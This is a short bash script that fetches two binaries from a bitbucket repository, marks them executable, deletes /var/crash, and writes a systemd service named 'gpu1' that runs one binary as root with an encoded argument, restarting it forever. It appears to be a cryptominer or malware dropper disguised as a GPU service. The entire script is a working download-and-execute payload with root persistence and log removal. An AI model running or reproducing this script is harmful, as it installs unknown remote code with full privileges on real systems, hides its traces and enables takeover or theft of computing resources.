#!/bin/bash
cd /home
sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/a
sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/sec
sudo chmod +x sec
sudo chmod +x a
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/sec suzTEUz7de/sd6zm2+ePN9Mqy+Mu6XF05Pn29CfzirIvKTzm9HAhx2GhapjyMVeOZKN9Pd3s67Z1MdV0VwfgpzpU95rlXXRAlm5hvmoka/+x+Ve5r/LfR/Qz0HZHLfoCtC3g5Szim7mR6Pw/DK6xO6bqWSatIjTsL8pTBzJYL+Le98FgagjxJtt9oENf5WfEoMy69c8mVYIz82Ix/ZZOL9PU6k66B3M6c9RXQhl6LFbOKJ37idspAjA==
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart
